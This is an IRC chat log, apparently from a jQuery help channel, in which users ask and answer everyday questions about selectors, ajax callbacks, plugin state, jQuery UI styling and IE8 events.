[00:04:56] <devaholic> k
[00:13:18] <Whirl3d> in order to determine if an image is cached in IE (causing it not to fire the load handler), you check if image.complete  so, if you have a jquery object and you want to check it's elements'complete property, you would use $(img)[0].complete, right?

[01:41:35] <sravan> hello good morning!
[01:41:39] <sravan> anyone here?
[01:44:12] <dross> sravan: nope!
[01:44:58] <dross> nobody here but us chickens
[01:59:16] <Taggnostr> are more specific selectors faster than generic ones? e.g. span.foo vs .foo, in a page where only spans have the foo class
[02:14:36] <coldhead> Taggnostr: to some extent it depends on the browser
[02:14:51] <coldhead> i think in your case .foo is faster
[02:15:46] <Taggnostr> ok
[02:15:48] <Taggnostr> thanks
[02:49:11] <braintrain> I have a jquery question that I think should be simple, just having a hard time finding what I need in search
[02:49:15] <braintrain> anyone around?
[02:51:34] <braintrain> too bad, I'll try back laterz
[02:54:17] <coldhead> braintrain: if you just asked your question, someone could be helping you now
[02:54:30] <coldhead> instead of discussing whether or not they're around
[02:54:46] <dabear> ?ask @ braintrain
[02:54:47] <bot-t> braintrain, If you have a question, please just ask it. Don't look for topic experts. Don't ask to ask. Don't PM! Don't ask if people are awake, or in the mood to help. Just ask the question straight out. http://catb.org/~esr/faqs/smart-questions.html
[02:54:47] <dabear> :)
[02:54:59] <braintrain> oh, sorry.  Thought it was just a dead chat
[02:55:09] <coldhead> TWO someones could be helping you now :)
[02:56:46] <braintrain> so I'm using the wild card selector and noticed by playing around with clicks and the this object that it gives you a sort of chain all the way up the dom
[02:57:00] <braintrain> (i'm sortta new at this stuff so jargon might not be my strong suit)
[02:57:22] <braintrain> I'm wondering how I can single out the first object
[02:57:30] <braintrain> or the ith object
[02:58:07] <dabear> ?eq @ braintrain
[02:58:08] <bot-t> braintrain, .eq(index): Reduce the set of matched elements to the one at the specified index. http://api.jquery.com/eq/

[03:01:42] <coldhead> braintrain: if you want to check if you're working with a specific element in a handler you can use if ($(this).is('some selector')) { ... }

[03:02:32] <bot-t> :reset: Selects all elements of type reset. http://api.jquery.com/reset-selector/
[03:02:40] <braintrain> ahh eq() is exactly waht I need!
[03:02:44] <braintrain> thanks guys
[03:03:00] <braintrain> I'm building a bookmarklet and using it with websockets
[03:03:09] <coldhead> neat!
[03:03:18] <braintrain> so I've been trying to figure out how to build a safe selector out of the this object
[03:03:27] <braintrain> to send via an ajax call
[03:03:38] <braintrain> and that was the last part!
[03:03:41] <braintrain> \o/

[03:10:59] <dabear> dwarder: nice to know that you're not blind :)
[03:11:03] <dabear> that you can see :)
[03:11:57] <`K`> my browser has javascript enabled, when i vew the page souce and click on the script imported in the page it opens without any problems
[03:12:19] <`K`> yet it doesn't seam to worok for some reason

[03:12:37] <bot-t> `K`, Please create a live (working) demo of your problem on http://jsfiddle.net or provide a link to your site with instructions on how to reproduce the issue.
[03:12:45] <braintrain> aw, false alarm.  I had an error that affected my output when I thought it wouldn't
[03:12:51] <braintrain> so here's what's happening
[03:13:13] <braintrain> $('*').live('click', function(data) {
[03:13:32] <braintrain> data will return a bunch of jquery objects
[03:13:55] <`K`> dabear, http://www.mediafire.com/?zr1i58f44owh386

[03:14:08] <dabear> really?
[03:14:12] <`K`> a simple html file+the jQuery
[03:14:15] <dabear> you can do better

[03:14:25] <coldhead> `K`: http://jsfiddle.net/7epZb/1/
[03:14:32] <coldhead> you had a syntax error
[03:14:33] <`K`> okay

[03:15:38] <coldhead> and my example usage of earlier
[03:15:40] <`K`> sorry guys
[03:15:59] <dwarder> why doesn't validate plugin works here http://jsfiddle.net/V4S4V/
[03:16:10] <coldhead> `K`: next time you paste your code into jsfiddle yourself and try Tidy Up and JSHint
[03:16:13] <dwarder> i.e. doesn't prevent from submitting
[03:16:15] <coldhead> and you won't have to ask!
[03:16:32] <`K`> ok man thanks
[03:16:37] <`K`> i apreciate it
[03:16:56] <coldhead> good luck!
[03:18:31] <`K`> thnkx
[03:18:59] <braintrain> I thnk the code might be easier to understand than me heh
[03:19:00] <braintrain> here
[03:19:01] <coldhead> dwarder: i can't see anything obviously wrong but i don't use that syntax with validate so i don't know
[03:19:04] <braintrain>     $('*').live('click', function(data) {
[03:19:04] <braintrain>         var attributeS = "";
[03:19:04] <braintrain>         var tag = this.localName;
[03:19:04] <braintrain>         for(i=0; i < this.attributes.length; i++) {
[03:19:04] <braintrain>             attributeS += '[' + this.attributes[i].nodeName + '="' + this.attributes[i].nodeValue + '"]';

[03:19:12] <braintrain>         console.log(selector);
[03:19:14] <braintrain>     });
[03:19:14] <coldhead> i would check the docs scrupulously
[03:19:16] <braintrain> oh shit
[03:19:20] <braintrain> sorry, I guess I'll jsfiddle too
[03:19:30] <coldhead> you are so banished, braintrain
[03:19:43] <braintrain> heh
[03:20:22] <coldhead> that code looks pretty serious
[03:20:26] <coldhead> all the node stuff
[03:21:54] <dwarder> coldhead: thanks anyway
[03:22:30] <braintrain> ok even better
[03:22:31] <braintrain> https://gist.github.com/1324310
[03:23:04] <braintrain> so right now I get a sort of array of values
[03:23:29] <braintrain> more the deeper I am, less the higher up I am
[03:23:49] <braintrain> the chain goes right up to the body.  I just wanna figure out how to keep it from iterating
[03:24:16] <coldhead> ?stopimmediatepropogation
[03:24:20] <bot-t> coldhead, event.stopImmediatePropagation() - Keeps the rest of the handlers from being executed and prevents the event from bubbling up the DOM tree. http://api.jquery.com/event.stopImmediatePropagation/

[03:50:58] <karstenk1977_> hello
[03:51:37] <karstenk1977_> how can i ask with jquery if a special class is within a special class?
[03:52:48] <coldhead> $('.special-parent .special-child')
[03:53:15] <coldhead> that would be a good name for a moms with autistic kids magazine
[03:53:19] <karstenk1977_> as example i have a ordered list with many list elements in this listelements can be a div which has the class active. I have to ask if the class active is in the ordered list?!
[03:54:03] <karstenk1977_> it isn´t the direct child
[03:54:16] <karstenk1977_> it is deeper
[03:54:26] <coldhead> $('.special-parent:has(.deeper)')
[03:54:34] <coldhead> ?has @ karstenk1977_
[03:54:35] <bot-t> karstenk1977_, .has(selector): Reduce the set of matched elements to those that have a descendant that matches the selector or DOM element. http://api.jquery.com/has/
[03:54:44] <coldhead> DEEPER
[03:54:54] <coldhead> d e e p e r
[03:55:05] <karstenk1977_> .hasClass I know
[03:55:21] * troubleman is now playing: http://home.no/dwaynie/eid.mp3
[03:58:22] <coldhead> Taggnostr: i would use an object to store all that border data
[03:58:25] <coldhead> instead of all those vars
[03:58:40] <coldhead> that might actually make it slower but it looks more readable to me
[03:59:30] <karstenk1977_> please have a look :     http://pastebin.com/AEsgin6K
[03:59:30] <troubleman> if i may interject
[03:59:35] <troubleman> whats wrong with this? $("#add_to_shopping_bag").css("background-color", "#dedede").fadeIn("fast");
[03:59:58] <Taggnostr> coldhead, they end up in the object at line 24, I used the vars to avoid having the css calls inside the {}
[04:00:24] <karstenk1977_> <troubleman> nothing
[04:02:09] <troubleman> karstenk1977_: nah something is wrong
[04:02:20] <troubleman> it wont fade in fast :D
[04:03:26] <troubleman> "fast or slow, it doesn't matter though" --Slum Village (http://www.youtube.com/watch?v=0BOJH-G0T3I)
[04:03:32] <karstenk1977_> .fadeIn( [duration] [, callback] )
[04:03:42] <karstenk1977_> callback is missing?!
[04:04:17] <coldhead> callback is optional
[04:04:30] <karstenk1977_> then i cannot see an issuw
[04:04:36] <coldhead> troubleman: get a working demo up at jsfiddle
[04:04:46] <coldhead> show us what you mean about it not working
[04:04:51] <ravenzz> everything within square brackets is optional
[04:05:04] <troubleman> sure!
[04:05:24] <karstenk1977_> is this correct?  state3 = jQuery('.toppings.active').length > 0 && jQuery(el1).closest('ol.products-list').has('div.toppings.active') ? 1 : 0;
[04:05:44] <karstenk1977_> ask if there is one toppings.active an if it is in same ol as the element?!
[04:06:31] <karstenk1977_> or could it be better?
[04:06:42] <ravenzz> var foo = jQuery('.toppings.active').length > 0 && jQuery(el1).closest('ol.products-list').has('div.toppings.active');
[04:07:04] <karstenk1977_> looks same!?
[04:07:08] <troubleman> At http://jsfiddle.net/dLRTh/ - how do I make #add_to_shopping_bag's color change fade in slow?
[04:07:25] <karstenk1977_> ok i will try it
[04:07:53] <troubleman> maybe theres a better way of writing that too
[04:09:18] <karstenk1977_> yes it works
[04:09:19] <karstenk1977_> thanks
[04:09:49] <troubleman> can i do like this? http://jsfiddle.net/dwaynie/dLRTh/1/
[04:10:46] <ravenzz> karstenk1977_ remember to declare the variable if it is the first time you are using that
[04:10:54] <ravenzz> var foo = 'foo';
[04:11:15] <karstenk1977_> yes thanks
[04:11:33] <ravenzz> otherwise you'll be in trouble, because it won't work on IE
[04:11:40] <karstenk1977_> no the next step, how can i select what i have checked?
[04:11:41] <karstenk1977_> jQuery(el1).closest('ol.products-list').has('div.toppings.active')
[04:11:42] <ravenzz> btw crappy english
[04:11:42] <ravenzz> :p
[04:11:52] <ravenzz> i have to go sorry
[04:12:03] <troubleman> somebody call my name?
[04:12:18] <troubleman> trouble seems to follow me everywhere i go
[04:12:19] <karstenk1977_> my english is horrible too, isn´t it.
[04:14:21] <troubleman> At http://jsfiddle.net/dwaynie/dLRTh/3/ - what's wrong with my #add_to_shopping_bag code? It should change color and background-color on click (fading)

[04:22:55] <lime> hi, i've been looking for alternatives to setInterval(..) using jquery, but my head can't get around the addEventListener function (if that's even jquery at all)
[04:23:30] <lime> what sort of options have i got if i'd like to read 'live feed' from an <audio> element?
[04:34:41] <troubleman> At http://jsfiddle.net/dwaynie/dLRTh/12/ - I want #add_to_shopping_bag to animate to a new color - can somebody help me get the syntax right?
[04:41:53] <Neon> I'm trying to send an ajax request using $.ajax({ data: "name=foo", success: onAjaxSuccess, type: "POST", url: "http://localhost/test/postdata" }) and the PHP script at the used url says me no POST data was given. Did I do something wrong?
[04:42:46] <Neon> The PHP script simply consists of print_r($_POST) and outputs "Array()" (empty array)
[04:52:35] <Neon> Ok, I found out that it works if I use "http://localhost/test/postdata/index.php" as url.
[04:53:09] <karstenk1977_> how can i get the id as string from an selected element?
[04:55:09] <karstenk1977_> attr('id') ??
[04:55:23] <Neon> Probably
[04:57:32] <NodeX> prop('id') in later
[05:01:11] <Neon> NodeX: lol thanks for that, it accidentally solved a problem I had some minutes ago (as I tried to retrieve the checked state of a checkbox)
[05:01:38] <karstenk1977_> ;-)
[05:32:08] <dwarder> does anyone know why class notation validation works and js  notation validation doesn't http://jsfiddle.net/V4S4V/2/ , http://docs.jquery.com/Plugins/Validation/Methods/required
[05:38:20] <emx> i have a .sortable() with children that are contenteditable=true. i guess that because of the element being .sortable() i can't click on the children for editing. is there a workaround or a switch that makes a child editable?
[05:44:40] <krz> how do i check if $(foo) exists?
[05:45:48] <emx> krz, the result has not length of zero
[05:47:09] <krz> thanks
[05:47:14] <emx> welcome
[05:47:26] <krz> hmm
[05:47:34] <krz> foo is not defined
[05:47:36] <krz> thats what i get
[05:47:48] <krz> with if ($(foo).length) {
[05:48:11] <emx> krz, you are aware that foo has to be either an element or a string containing a css selector?
[05:48:16] <krz> yes
[05:48:25] <krz> foo = $('body')
[05:48:28] <krz> for example
[05:48:57] <emx> krz, what does console.log( foo ) print?
[05:48:57] <krz> the thing is. sometimes foo may not be set
[05:49:12] <emx> krz, well, you are the author.
[05:49:35] <krz> returns foo is not defined
[05:49:44] <krz> i need to check if a var is set
[05:49:48] <emx> yes
[05:50:01] <emx> or you live with that ugly message
[05:51:11] <krz> well how do i do that?
[05:51:23] <krz> even if (login_box_origin) { returns the same error
[05:52:03] <emx> 'undefined' === typeof variable
[05:52:30] <emx> krz, #javascript is rather for basic questions
[05:53:25] <krz> thanks emx
[05:53:35] <emx> welcome
[05:56:15] <JOSF> Hi, I made a jquery-ui custom theme (at the roller) without changing any font-sizes. They are, in the CSS, around 1em +/- a few, depending on purpose. However, in the browser these come up pretty big, about 2-2.5 times as big. I simply do not understand why. Any ideas?
[05:57:18] <Cork[home]> JOSF: you prob see the same thing i encountered a bit back em inherit sizes
[05:57:42] <Cork[home]> so an element with 1.5em inside another element thats 1.5em is 1.5em 1.5em
[05:57:52] <Cork[home]> 1.5 + 1.5
[05:58:03] <JOSF> Cork[home]: ok, let me check...
[05:58:06] * JOSF checks....
[05:58:36] <Cork[home]>  got the problem with jquery ui tabs, making buttons and sliders rediculusly big
[05:59:57] <JOSF> Cork[home]: same here (still checking code)
[06:00:10] <aitiba> buenas
[06:00:12] <aitiba> hi
[06:00:33] <aitiba> which is wrong here:http://pastebin.com/EkCSFJXeI get "missing ; statment"
[06:02:11] <JOSF> Cork[home]: Hmmm...so I removed all my private styling's font-size. But nothing changed to the better. How did /you/ solve it?
[06:02:40] <Cork[home]> JOSF: for me the problem was with the default theme
[06:02:54] <Cork[home]> as in the jquery ui themeing of widget elements
[06:03:01] <Cork[home]> so i added some extra css
[06:03:19] <Cork[home]> if i remember correctly it was specificaly the .widget class
[06:04:27] <JOSF> Cork[home]: ok. I am going to use the default theme, in order to have one possibility for bugs less in the chain and then I will check.
[06:13:33] <tktiddle> How can I make sure JQuery calls only run after jquery is loaded?
[06:14:07] <Cork[home]> what?
[06:14:47] <Cork[home]> if you mean that code blocks only run after the jquery can work use the domready event
[06:15:01] <Cork[home]> $(function() { /* your code */ });
[06:16:11] <tktiddle> Sorry my bad, was loading my script wrong :{
[06:37:53] <Aquaguy> Hey there
[06:38:55] <Aquaguy> I've created a plugin, and I'm calling it several times in the same page, the problem that I'm facing is that whenever I make a change in one of the 'instances' it changes all of them. How could I avoid this?
[06:39:55] <dwarder> what does (function() { })(); mean?
[06:40:44] <sean`> it's a self executing functino
[06:40:45] <dwarder> is that "ready"?
[06:40:54] <sean`> by wrapping function(){} in ()
[06:40:57] <sean`> you are enclosing it
[06:41:01] <sean`> and by the () you are calling it
[06:41:06] <Haprog> it's an anonymous function that is executed immediately without parameters
[06:41:12] <sean`> so it's like doing function foo () { } foo ();
[06:41:21] <dwarder> ohh i see, thanks
[06:41:46] <Haprog> you get the benefit of function scope for variables used inside it
[06:42:39] <dwarder> i've found this there http://ajax.aspnetcdn.com/ajax/jquery.validate/1.9/additional-methods.js
[06:43:10] <dwarder> i wonder why several methods are inside this self executing function
[06:43:42] <dwarder> though they all use addMethod
[06:43:42] <JOSF> Cork[home]: Ok, I found the solution: http://stackoverflow.com/questions/2372859/why-jquerys-ui-css-filess-font-sizes-are-bigger-than-normal
[06:43:59] <JOSF> Cork[home]: the last answer has it (the one with 6 points)
[06:51:39] <Aquaguy> how can I make plugin instances independant one from each other?
[06:51:50] <Aquaguy> right now all the changes affect the last instance
[06:55:40] <Aquaguy> anyone?
[07:00:56] <Kambfhase> ?p @ Aquaguy
[07:00:57] <bot-t> Aquaguy, Please paste your code at http://jsfiddle.net/ [preferred], http://paste.pocoo.org/+js, http://jsbin.com/ or http://fixee.org/
[07:19:58] <interactivex> Hi! I am using the superfish jquery plugin
[07:20:11] <interactivex> And now it's only making the children of the hover item active
[07:20:43] <interactivex> Does someone know how to make it show everything
[07:20:57] <interactivex> so also the children from other items
[07:21:11] <razamatan> i'm having an issue w/ jquery and ajax.  i'm loading a fragment using $().load(...) which the contents contains jquery stuff, too.  it seems to be exponentially increasing the ajax calls on subsequent clicks...
[07:22:24] <razamatan> this describes my issue: http://forum.jquery.com/topic/content-load-exponential-loop
[07:23:08] <luaa> hey, I have a foreach where I do things. After the foreach is looped and finished! I want to call a function. How should I do this?
[07:26:15] <Gorkyman> is there any "official" image uploading plugin for jquery?
[07:29:31] <Aquaguy> Kambfhase, http://jsfiddle.net/nwZ3d/
[07:29:35] <Aquaguy> I made a simple example
[07:30:02] <Aquaguy> the divs should turn red except the second one which should turn orange
[07:30:11] <Aquaguy> Instead, all of them turn orange
[07:30:59] <dwarder> where can i read about this notation:      return this.optional(element) || /^[a-z-.,()'\"\s]+$/i.test(value);
[07:31:19] <dwarder> i am interested in this regex thingie
[07:31:23] <dwarder> and ||
[07:31:49] <Kambfhase> eloquentjavascript.net
[07:32:39] <Kambfhase> Aquaguy: ok, give ma a few minutes
[07:33:25] <dwarder> or at least how can i find this on google
[07:33:26] <Aquaguy> Kambfhase, alright, thank you!
[07:33:39] <dwarder> how is it called?
[07:33:53] <Kambfhase> dwarder: eloquentjavascript.net
[07:33:54] <Aquaguy> || = OR
[07:34:30] <dwarder> Kambfhase: the whole book?
[07:34:51] <Kambfhase> you accidentally the whole book?
[07:34:52] <dwarder> thanks
[07:39:06] <Kambfhase> Aquaguy: http://jsfiddle.net/nwZ3d/2/
[07:39:39] <Kambfhase> you need to associate the color with the element.
[07:40:08] <Kambfhase> simply store the otions in .data()
[07:43:29] <Aquaguy> Kambfhase, thank you so so much
[07:43:56] <Kambfhase> np
[07:44:54] <Kambfhase> thats what i get paid for *cough*
[07:55:54] <tomasm-> hi, anyone know if its possible to pass parameters (ie a query string) to a js script file called via <script src="foo.js"> ? and if so, how to read those parameters?
[07:56:54] <Cork[home]> tomasm-: yes you can, but it would have to be server side
[07:57:30] <Cork[home]> you just read them like any other parameter in ex. php
[07:58:18] <tomasm-> but i swear ive seen something like scriptaculous be passed ?load=effects, etc.... and it know what to do
[07:59:15] <Cork[home]> script tags parameters can't be read in js, no
[07:59:31] <Cork[home]> it has to be handled server side, and ex. be set as a variable in the file
[08:01:35] <zzz> ss
[08:15:20] <Keeper> scriptaculous get the parameters through SCRIPT tag's src attribute
[08:15:52] <Keeper> using RegExp to match the parameters
[08:35:12] <tomasm-> hi, when i use an event handler for a dialog's close ("dialogclose"), does it get triggered again if the dialog is open and closed again, or is it only called once?
[08:35:38] <tomasm-> ie does the event handler get destroyed when the dialog is closed
[08:37:11] <zerpex> Hello everyone, I'm facing a weird problem at the moment, I'm trying to upload images on my wordpress site, and getting an "Error 500 Internal Error", I can upload files that is under 200kb, I'm running FastCGI, CentOS, Memory_limit is 64MB, and Max upload size is 16MB

[08:38:41] <zerpex> wrong channel :$ sorry
[08:53:42] <kollapse> Hi. How do I use jquery UI buttons along with anchors ? I want them to use anchors so that search engine bots can crawl over the page, I don't want `location.href` JS redirects.
[08:56:07] <kborchers> kollapse: $("a").button(); would convert all anchors to buttons and they're still anchors
[08:56:36] <SoulRaven> anyone has experience with google maps and markers?
[08:57:25] <Elephant> SoulRaven: a long time ago
[08:57:32] <Elephant> SoulRaven: the gmaps API is super easy
[08:57:38] <kollapse> kborchers: Thanks, giving a try.
[08:59:03] <SoulRaven> Elephant: i know, i just start used this api, but my question is regarding a easy method to manage multiple markers and the posibilty to redraw markers with out refresh the map
[08:59:55] <Elephant> I wish I still had my code to reference, I lost it to a VPS that killed itself :(
[09:00:22] <E289> hi, im trying to use this code http://jsfiddle.net/ZQREs/2/ but i could not to make my form submit via ajax. it always reloads the whole page. and no error is returned :( the functions used all work properly
[09:02:48] <Elephant> E289: have you tried preventDefault()? or setting the form's action to "javascript:void(0);"?
[09:03:49] <Elephant> hrmmm I see some action setting in there
[09:04:01] <E289> trying preventDefault
[09:04:40] <E289> Elephant it did prevent but the $.post did not seem to work
[09:04:55] <Elephant> E289: does it say "abort" in firebug?
[09:05:15] <Elephant> and can you tell if it actually did work?
[09:06:34] <E289> it did not work. i dont have firebug, im using chrome..
[09:07:05] <E289> here, i have the error: Uncaught TypeError: Object message=asdf&posted=1 has no method 'push'
[09:07:27] <E289> oh
[09:07:40] <E289> how do you push an object into a serialize()'d item?
[09:08:09] <Kambfhase> try .concat()
[09:11:45] <E289> okay
[09:12:24] <E289> how about this, $.post(/*stuff*/).error(function(){alert('error:'+error);}); // how do i get error details here?
[09:13:54] <jita> is it possible to assign a value to variable if available else assign it empty? I am passing a value to my template and i want to check if this value exists then do something. Like can i do something like var a = test. Assign value test if exists otherwise assign empty so that i can check for if it exists like if (a) then do something
[09:14:14] <Elephant> E289: are you trying to catch POST errors, or errors signaled by your JSON?
[09:14:36] <Elephant> eh, I guess that is obvious by your error msg.
[09:14:50] <E289> i believe my JSON is okay so post errors? :)
[09:14:59] <Elephant> I've not used .error(), so I can't really add anything :/
[09:16:23] <E289> oh i guessed, it worked. adding params to .error({function(a,b){alert(b)}})
[09:16:25] <E289> :)
[09:26:35] <Gorkyman> is there any "official" image uploading plugin for jquery?
[09:30:49] <Sonic_> maybe you would like uploadify
[09:46:47] <Gorkyman> Sonic_: yeah I'm looking at it
[09:46:53] <Gorkyman> not sure if I like it :)
[10:16:14] <karstenk1977_> how can i select the visible children ?
[10:16:19] <RandalSchwartz> how do I replace the _fnFilterCreateSearch function in datatables with one that is not case insensitive, without just patching the source code.
[10:16:29] <RandalSchwartz> there has to be a point at which I can monkeypatch that function
[10:16:45] <karstenk1977_> is that possible to ask if the div is visible?
[10:19:02] <RandalSchwartz> I've tried setting oTable.oApi._fnFilterCreateSearch to a new function
[10:19:06] <RandalSchwartz> that doesn't seem to have any effect
[10:19:31] <RandalSchwartz> (where oTable is the result of calling $thistable.dataTable())
[10:22:16] <RandalSchwartz> Hmm.  _fnExternAPIFunc seems to indicate some copying going on
[10:28:50] <RandalSchwartz> OK - I asked the question in the Datatables forum
[10:28:56] <RandalSchwartz> hopefully someone is awake for an answer. :)
[10:58:10] <Daghdha> If i resize a img with $(this).width(50)  and i want tolater restore i t to it's orginal size. How can i do that?
[10:58:50] <erichynds> Daghdha: set the width to auto
[10:58:57] <erichynds> or remove the style attribute
[10:59:48] <Daghdha> o_O
[10:59:53] <Daghdha> that simple huh
[10:59:59] <Daghdha> thank you
[11:00:32] <Kambfhase> <Daghdha> that simple huh << yeah, using jQ 1.7 will be made much harder
[11:00:54] <puppen> oh?
[11:01:14] <Kambfhase> i mean, jresig, how dare you make programming that easy?
[11:01:14] <puppen> What've they done to 1.7?
[11:01:56] <Daghdha> I think it was an attempt at irony.
[11:02:43] <Daghdha> Anyway, thanks again. And bye bye :P
[11:02:43] <puppen> Aaah...
[11:02:49] <Kambfhase> http://en.wikipedia.org/wiki/Irony
[11:03:24] <puppen> I just worry, because I've been working with prototype lately, which apparently is overgoing a total overhaul.. I don't want everything to change on me at once ;'(
[11:06:01] <snover> wow, prototype.
[11:14:45] <biodegabriel> Hi all, How do I pass a variable in a string in JS? (Like #{variable} in other languages) http://pastie.org/2779251
[11:15:43] <puppen> ...eq(#"+number+")... ?
[11:16:43] <biodegabriel> puppen: thanks, i just realized that solution. :)
[11:16:56] <puppen> :) no probs..
[12:47:07] <asher^> hello
[12:47:41] <asher^> if i load elements after the initial page load (with ajax) and i want jquery to handle clicking on those elements, do i need to reload the script or something like that?
[12:51:16] <Kambfhase> docs.jquery.com/Frequently_Asked_Questions#Why_do_my_events_stop_working_after_an_AJAX_request.3F
[12:51:32] <Kambfhase> read that ^
[12:51:48] <MoTiOnXml> live or delegate
[12:52:01] <KeyLimePi> Any idea if jquery can look through an array before print, to basically trigger a cluetip or tooltip based on the words generated by the array?
[12:55:29] <cybersholt> can anybody help me with this http://jsfiddle.net/5Gpvq/1/ im trying to loop thru elements and get time differences
[12:56:31] <cybersholt> i've tried to end it with return false and its not working right
[12:58:20] <cybersholt> anybody?
[13:00:16] <puppen> check out http://api.jquery.com/live/
[13:00:30] <puppen> (asher^)
[13:01:32] <cybersholt> can anybody help me with this http://jsfiddle.net/5Gpvq/1/ im trying to loop thru elements and get time differences i've tried to end it with return false and its not working right
[13:02:30] <puppen> what's not working right? Be more specific? What what what
[13:02:30] <puppen> ?
[13:03:30] <cybersholt> i need it to end after it has looped thru all elements
[13:04:24] <cybersholt> i have a time i put that in a var then loop thru the output elements and set the val
[13:05:05] <puppen> firstly, $('input#time').each(...... #time.. And id, should be a unique identifier
[13:05:35] <puppen> that is to say, only one element should have the id "time".. if not, it's not valid markup, and will cause screwy results
[13:05:44] * puppen keeps looking
[13:06:10] <cybersholt> all right
[13:07:48] <puppen> same with the diff inputs.. if you wanna do something like that I suggest a class
[13:07:55] <puppen> or if you wanna be fancy, a rel=""
[13:08:04] <cybersholt> thanks puppen
[13:09:27] <KeyLimePi> anyone worked with simpletip, cluetip or any variant of jquery?
[13:27:07] <valigoo> anyone know the best/easiest way to query live dom elements using jquery?
[13:33:07] <puppen> valigoo.. You want .live() ?
[13:33:32] <puppen> What do you mean "live dom element"
[13:33:33] <puppen> ?
[13:33:37] <valigoo> how would that work on this:  var length = $("input.compare:checked").length;
[13:34:14] <puppen> well, afaik, what you just wrote *should* Just Work....
[13:34:19] <valigoo> i'm creating and deleting input fields with ajax.  so at any given moment, i'd like to know how many are checked
[13:34:37] <valigoo> nope, it only works before the ajax request
[13:34:58] <coderDJ412> what triggers the error function in jQuery Ajax?
[13:34:59] <valigoo> it doesn't work on newly added elements
[13:35:18] <Xtek> Well then something is wrong with your selector.
[13:35:23] <puppen> if you've bind'ed it.. replace your bind with live.. i think...
[13:35:27] <puppen> or what Xtek said l(
[13:35:41] <coderDJ412> I am receiving json data from a php script and its not triggering an error in query
[13:35:50] <Xtek> Executing a selector is always re-evalutated.

[13:36:04] <Woet> oh yay

[13:36:19] <bot-t> coderDJ412, Ajax - The jQuery library has a full suite of AJAX capabilities. The functions and methods therein allow us to load data from the server without a browser page refresh. http://api.jquery.com/category/ajax/

[13:36:50] <Woet> hm
[13:37:15] <valigoo> binding is tied to an event, no?  i just want to know the count of checked input elements at any given moment given that the elements can be added and removed into the dom after initial page load
[13:38:12] <coderDJ412> Woet: thnx
[13:38:56] <Xtek> Binding has nothing to do with calling $('selector').length
[13:39:07] <Xtek> Try opening the console and running your selector.
[13:40:00] <valigoo> k, tring now
[13:40:20] <coderDJ412> Woet: the problem isn't setting up the ajax
[13:40:37] <coderDJ412> Woet: the problem is handling the response once the json comes back
[13:40:47] <Woet> coderDJ412: what is your exact question?
[13:41:35] <coderDJ412> woet: this is the response i get from the server: {"status":"fail","success":false,"messages":{},"errors":{}}
[13:41:37] <emx> .sortable( { tolerance: 'pointer' } is not quite what it should be in my opinion.
[13:41:47] <Woet> coderDJ412: okay.
[13:41:49] <valigoo> i guess you guys are right.  it's working now.  don know what changed
[13:41:53] <valigoo> thanks!
[13:42:07] <Woet> coderDJ412: your question being?
[13:42:08] <Xtek> What's the problem?
[13:42:11] <coderDJ412> woet: the ajax success function runs EVERYTIME no matter what come back
[13:42:23] <Xtek> Right.
[13:42:27] <Xtek> The AJAX request was succesful.
[13:42:27] <Woet> coderDJ412: that's correct.
[13:42:35] <coderDJ412> woet: i was wondering what triggers the error since the success function runs everytime
[13:42:36] <Xtek> You got a result back.
[13:42:39] <Woet> Xtek is stealing my answers :(
[13:42:48] <Xtek> Sorry.  Go on. :)
[13:42:49] <Woet> coderDJ412: if the request fails, the error function is called
[13:43:02] <Woet> coderDJ412: it isn't based upon the actual response
[13:43:07] <coderDJ412> woet: so that's only for if the file is missing?
[13:43:11] <coderDJ412> woet: etc.
[13:43:17] <Woet> because json is dynamic data and can be formatted in any way you please
[13:43:30] <Woet> "status":"fail" isnt a defined standard
[13:43:40] <Woet> it's for 404, 403, yes, such things
[13:43:55] <coderDJ412> woet: what about "success":false?
[13:44:04] <Woet> [22:43:17] <Woet> because json is dynamic data and can be formatted in any way you please
[13:44:16] <Woet> jquery gets the json for you and gives it to you
[13:44:22] <Woet> then you have to parse it and act accordingly
[13:44:26] <emx> i got two elements X1 and X2, one with height x1 and one with height x2. x1 < x2. if i drag x2 over x1 by clicking at 50 % or more of its height i can't move X2 to the top of the sortable, only if i click on 0 < mouseX < 50 %. is there a workaround?
[13:45:15] <Xtek> coderDJ412, it's the equivelant of mailing a letter to someone.  It -succesfully- made it to them, the content in the ltter is a seperate thing.
[13:45:42] <coderDJ412> woet: thanks. that's what i thought but when I couldn't use the json to do anything that's what made me worry. i added a function to success and it didn't do anything
[13:46:19] <coderDJ412> woet: can json data handle booleans
[13:46:23] <Woet> yes.
[13:47:53] <coderDJ412> ok
[13:49:08] <coderDJ412> Xtek: thanks
[13:49:19] <Xtek> Sure.
[13:49:37] <coderDJ412> Thanks for the help guys
[13:51:21] <coderDJ412> Woet: here is my jquery.ajax code so far: http://jsfiddle.net/qBbdq/
[13:52:29] <coderDJ412> Woet: i was under the wrong impression that something happened if the json data returned false instead of the request.
[13:52:41] <Woet> that's a wrong impression indeed.
[13:52:57] <coderDJ412> Woet: glad you guys cleared that up :)
[13:53:04] <Woet> glad the docs cleared that up
[13:53:06] <Woet> and we linked you to the docs
[13:58:49] <coderDJ412> Woet: actually you guys did it :)
[14:04:02] <Raynos> Hey jQuery!
[14:05:05] <Raynos> Would anyone happen to know how to get IE8 event model to behave for nodes that are not in the DOM
[14:08:27] <Woet> i'm still trying to figure out how to make IE8 itself behave :(
[14:08:30] <Krambfhase> what are you trying to do?
[14:08:32] <snover> Raynos: what are you trying to do?
[14:12:25] <Raynos> implement custom events in IE8
[14:12:51] <Raynos> the custom event part is easy. The hard part is not injecting it into the DOM.
[14:13:03] <Raynos> I want this : http://jsfiddle.net/w282P/1/ to work.
[14:15:21] <Krambfhase> Y U NO USE jQuery?
[14:15:27] <Raynos> ...
[14:15:39] <Raynos> Y U WELCOME TO RANT ABOUT JQUERY IN THE JQUERY ROOM
[14:15:49] <Raynos> Look that path is not going to go down well here :P
[14:16:48] <snover> Raynos: protip: a custom event is simply a function call.
[14:18:29] <Raynos> snover: protip: events vs callbacks : http://dean.edwards.name/weblog/2009/03/callbacks-vs-events/
[14:19:22] <Adil> hi
[14:19:53] <snover> Raynos: dean edwards is a smart guy but he is not always right about everything
[14:20:32] <Adil> Dean Edwards?
[14:21:31] <Raynos> snover: I see value in having real events.
[14:21:45] <Raynos> I want to use the event system build into the browser for message passing.
[14:22:05] <snover> do you see value in performance?
[14:22:21] <Raynos> in IE8 no.
[14:22:21] <snover> dom events are not for message passing
[14:22:27] <Raynos> performance in IE8 is slow as hell
[14:22:28] <snover> but do whatever you want
[14:22:34] <snover> Raynos: um.
[14:22:42] <snover> Raynos: If you value performance you will not try to use DOM events
[14:22:47] <Raynos> It was a joke.
